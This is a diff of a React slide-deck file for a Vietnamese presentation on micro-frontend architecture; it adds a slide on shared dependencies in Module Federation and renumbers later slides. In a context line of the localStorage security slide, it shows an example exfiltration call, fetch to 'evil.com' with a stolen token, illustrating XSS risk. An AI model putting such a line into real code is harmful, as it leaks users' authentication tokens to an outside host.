@@ -151,7 +151,7 @@ export const slides: SlideData[] = [
                 >
                     <p className="text-slide-body leading-relaxed">
                         Micro-Frontend là kiến trúc chia một ứng dụng frontend <span className="text-[var(--accent-red)]">monolithic (đơn khối)</span>
-                        thành các ứng dụng <span className="text-[var(--accent-green)]">nhỏ hơn, độc lập</span>.
+                        {" "}thành các ứng dụng <span className="text-[var(--accent-green)]">nhỏ hơn, độc lập</span>.
                     </p>
                 </motion.div>
                 <div className="grid grid-cols-3 gap-4">
@@ -370,6 +370,7 @@ const ProductGrid = lazy(() =>
                         ['<span class="text-[var(--accent-orange)] font-bold">remoteEntry.js</span>', 'File manifest chứa metadata', 'http://...3002/remoteEntry.js'],
                         ['<span class="text-[var(--accent-purple)] font-bold">Shared</span>', 'Dependencies chia sẻ giữa apps', 'react, react-dom, antd'],
                         ['<span class="text-[var(--accent-cyan)] font-bold">Singleton</span>', 'Đảm bảo chỉ 1 instance', 'React phải singleton!'],
+                        ['<span class="text-[var(--accent-pink)] font-bold">Eager</span>', 'Load ngay khi app start, không lazy', 'eager: true cho React'],
                     ]}
                 />
                 <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-blue)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
@@ -670,13 +671,50 @@ export default defineConfig({
         ),
     },
 
-    // ==========================================
-    // PHẦN 4: COMMUNICATION (Slides 20-25)
-    // ==========================================
-
-    // Slide 20: Communication Overview
+    // Slide 20: Tại sao cả Host và Remote đều khai báo Shared?
     {
         id: 20,
+        title: 'Tại sao Remote cũng khai báo Shared?',
+        section: 'Phần 3: Cấu hình Framework',
+        content: (
+            <div className="w-full max-w-5xl mx-auto">
+                <h2 className="text-slide-header mb-4">Tại sao cả Host và Remote đều khai báo Shared?</h2>
+                <div className="grid grid-cols-2 gap-6">
+                    <motion.div className="glass p-5 rounded-lg" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }}>
+                        <h4 className="text-[var(--accent-blue)] font-bold mb-3">1. Build-time độc lập</h4>
+                        <p className="text-sm text-[var(--text-secondary)]">
+                            Mỗi app được build riêng biệt. Lúc build, Remote không biết Host có gì → Remote phải nói "tôi cần React và sẵn sàng share".
+                        </p>
+                    </motion.div>
+                    <motion.div className="glass p-5 rounded-lg" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.1 }}>
+                        <h4 className="text-[var(--accent-green)] font-bold mb-3">2. Standalone mode</h4>
+                        <p className="text-sm text-[var(--text-secondary)]">
+                            Remote có thể chạy độc lập khi dev. Nếu không khai báo shared, nó sẽ không có React để chạy riêng.
+                        </p>
+                    </motion.div>
+                </div>
+                <motion.div className="mt-4 glass p-4 rounded-lg" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
+                    <h4 className="text-[var(--accent-purple)] font-bold mb-2">3. Negotiation 2 chiều tại Runtime</h4>
+                    <div className="font-mono text-sm space-y-1">
+                        <div><span className="text-[var(--accent-orange)]">Remote:</span> "Tôi cần react@18.2.0, sẵn sàng share"</div>
+                        <div><span className="text-[var(--accent-cyan)]">Host:</span> "Tôi có react@18.2.0, singleton=true"</div>
+                        <div><span className="text-[var(--accent-green)]">Runtime:</span> "OK, Remote sẽ dùng React của Host"</div>
+                    </div>
+                </motion.div>
+                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-red)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
+                    <strong className="text-[var(--accent-red)]">⚠️ Nếu Remote không khai báo shared:</strong> Remote sẽ bundle React riêng → duplicate code, hooks error!
+                </motion.div>
+            </div>
+        ),
+    },
+
+    // ==========================================
+    // PHẦN 4: COMMUNICATION (Slides 21-26)
+    // ==========================================
+
+    // Slide 21: Communication Overview
+    {
+        id: 21,
         title: 'Cross-App Communication',
         section: 'Phần 4: Communication',
         content: (
@@ -695,9 +733,9 @@ export default defineConfig({
         ),
     },
 
-    // Slide 21: Event Bus Definition
+    // Slide 22: Event Bus Definition
     {
-        id: 21,
+        id: 22,
         title: 'Event Bus là gì?',
         section: 'Phần 4: Communication',
         variant: 'section',
@@ -738,7 +776,7 @@ export default defineConfig({
 
     // Slide 22: Event Bus Diagram
     {
-        id: 22,
+        id: 23,
         title: 'Event Bus Pattern',
         section: 'Phần 4: Communication',
         variant: 'diagram',
@@ -752,7 +790,7 @@ export default defineConfig({
 
     // Slide 23: Event Bus Implementation
     {
-        id: 23,
+        id: 24,
         title: 'Event Bus Implementation',
         section: 'Phần 4: Communication',
         variant: 'code',
@@ -791,7 +829,7 @@ export const eventBus = new EventBus();`}
 
     // Slide 24: BroadcastChannel
     {
-        id: 24,
+        id: 25,
         title: 'BroadcastChannel API',
         section: 'Phần 4: Communication',
         variant: 'code',
@@ -835,7 +873,7 @@ channel.onmessage = (event) => {
 
     // Slide 25: Token Sync Flow
     {
-        id: 25,
+        id: 26,
         title: 'Token Sync Strategy',
         section: 'Phần 4: Communication',
         variant: 'diagram',
@@ -853,7 +891,7 @@ channel.onmessage = (event) => {
 
     // Slide 26: Token Storage Problem
     {
-        id: 26,
+        id: 27,
         title: 'Vấn đề với localStorage',
         section: 'Phần 5: Security',
         variant: 'code',
@@ -894,7 +932,7 @@ fetch('https://evil.com?token=' + token);`}
 
     // Slide 27: TokenStore Implementation
     {
-        id: 27,
+        id: 28,
         title: 'TokenStore Class',
         section: 'Phần 5: Security',
         variant: 'code',
@@ -934,7 +972,7 @@ export const tokenStore = new TokenStore();`}
 
     // Slide 28: Defense in Depth
     {
-        id: 28,
+        id: 29,
         title: 'Defense in Depth',
         section: 'Phần 5: Security',
         content: (
@@ -972,7 +1010,7 @@ export const tokenStore = new TokenStore();`}
 
     // Slide 29: CSS Problem
     {
-        id: 29,
+        id: 30,
         title: 'Vấn đề CSS Conflict',
         section: 'Phần 6: CSS Isolation',
         variant: 'code',
@@ -1002,7 +1040,7 @@ export const tokenStore = new TokenStore();`}
 
     // Slide 30: CSS Isolation Diagram
     {
-        id: 30,
+        id: 31,
         title: 'CSS Isolation Strategies',
         section: 'Phần 6: CSS Isolation',
         variant: 'diagram',
@@ -1016,7 +1054,7 @@ export const tokenStore = new TokenStore();`}
 
     // Slide 31: CSS Solutions Comparison
     {
-        id: 31,
+        id: 32,
         title: 'So sánh CSS Solutions',
         section: 'Phần 6: CSS Isolation',
         content: (
@@ -1040,7 +1078,7 @@ export const tokenStore = new TokenStore();`}
 
     // Slide 32: CSS Modules Example
     {
-        id: 32,
+        id: 33,
         title: 'CSS Modules - Ví dụ',
         section: 'Phần 6: CSS Isolation',
         variant: 'code',
@@ -1088,7 +1126,7 @@ const Button = ({ primary }) => (
 
     // Slide 33: CSS-in-JS Example
     {
-        id: 33,
+        id: 34,
         title: 'CSS-in-JS Example',
         section: 'Phần 6: CSS Isolation',
         variant: 'code',
@@ -1138,7 +1176,7 @@ const StyledButton = styled.button\`
 
     // Slide 34: Global CSS Handling
     {
-        id: 34,
+        id: 35,
         title: 'Xử lý Global CSS',
         section: 'Phần 6: CSS Isolation',
         content: (
@@ -1172,7 +1210,7 @@ const StyledButton = styled.button\`
 
     // Slide 35: BEM + Shadow DOM
     {
-        id: 35,
+        id: 36,
         title: 'BEM & Shadow DOM',
         section: 'Phần 6: CSS Isolation',
         variant: 'code',
@@ -1225,7 +1263,7 @@ shadow.innerHTML = \`
 
     // Slide 36: Routing Diagram
     {
-        id: 36,
+        id: 37,
         title: 'Routing trong MFE',
         section: 'Phần 7: Routing',
         variant: 'diagram',
@@ -1239,7 +1277,7 @@ shadow.innerHTML = \`
 
     // Slide 37: History Synchronization
     {
-        id: 37,
+        id: 38,
         title: 'History Synchronization',
         section: 'Phần 7: Routing',
         variant: 'code',
@@ -1287,7 +1325,7 @@ export function mount({ history, basename }) {
 
     // Slide 38: Single History Pattern
     {
-        id: 38,
+        id: 39,
         title: 'Single History Instance',
         section: 'Phần 7: Routing',
         variant: 'code',
@@ -1328,7 +1366,7 @@ const ProductsApp = ({ history, basePath }) => (
 
     // Slide 39: Lazy Load Routes
     {
-        id: 39,
+        id: 40,
         title: 'Lazy Load Remote Routes',
         section: 'Phần 7: Routing',
         variant: 'code',
@@ -1367,7 +1405,7 @@ const ProductsPage = () => {
 
     // Slide 40: CI/CD Pipeline
     {
-        id: 40,
+        id: 41,
         title: 'CI/CD Pipeline',
         section: 'Phần 8: DevOps',
         variant: 'diagram',
@@ -1381,7 +1419,7 @@ const ProductsPage = () => {
 
     // Slide 41: Versioning Strategy
     {
-        id: 41,
+        id: 42,
         title: 'Versioning Strategy',
         section: 'Phần 8: DevOps',
         content: (
@@ -1423,7 +1461,7 @@ const ProductsPage = () => {
 
     // Slide 42: Testing Strategy
     {
-        id: 42,
+        id: 43,
         title: 'Testing Strategy',
         section: 'Phần 8: DevOps',
         content: (
@@ -1463,7 +1501,7 @@ const ProductsPage = () => {
 
     // Slide 43: Common Errors
     {
-        id: 43,
+        id: 44,
         title: 'Troubleshooting',
         section: 'Phần 9: Troubleshooting',
         content: (
@@ -1485,7 +1523,7 @@ const ProductsPage = () => {
 
     // Slide 44: Error Boundary
     {
-        id: 44,
+        id: 45,
         title: 'Error Boundary Pattern',
         section: 'Phần 9: Troubleshooting',
         variant: 'code',
@@ -1524,7 +1562,7 @@ const ProductsPage = () => {
 
     // Slide 45: Performance Tips
     {
-        id: 45,
+        id: 46,
         title: 'Performance Optimization',
         section: 'Phần 9: Troubleshooting',
         content: (
@@ -1562,7 +1600,7 @@ const ProductsPage = () => {
 
     // Slide 46: Key Takeaways
     {
-        id: 46,
+        id: 47,
         title: 'Tổng kết',
         section: 'Phần 10: Summary',
         variant: 'section',
@@ -1596,7 +1634,7 @@ const ProductsPage = () => {
 
     // Slide 47: Best Practices Checklist
     {
-        id: 47,
+        id: 48,
         title: 'Best Practices Checklist',
         section: 'Phần 10: Summary',
         content: (
@@ -1633,7 +1671,7 @@ const ProductsPage = () => {
 
     // Slide 48: Qiankun vs Module Federation
     {
-        id: 48,
+        id: 49,
         title: 'Qiankun vs Module Federation',
         section: 'Phần 10: Summary',
         content: (
@@ -1656,7 +1694,7 @@ const ProductsPage = () => {
 
     // Slide 49: Resources
     {
-        id: 49,
+        id: 50,
         title: 'Tài liệu tham khảo',
         section: 'Phần 10: Summary',
         content: (
@@ -1687,7 +1725,7 @@ const ProductsPage = () => {
 
     // Slide 50: Thank You
     {
-        id: 50,
+        id: 51,
         title: 'Cảm ơn!',
         section: 'End',
         variant: 'title',
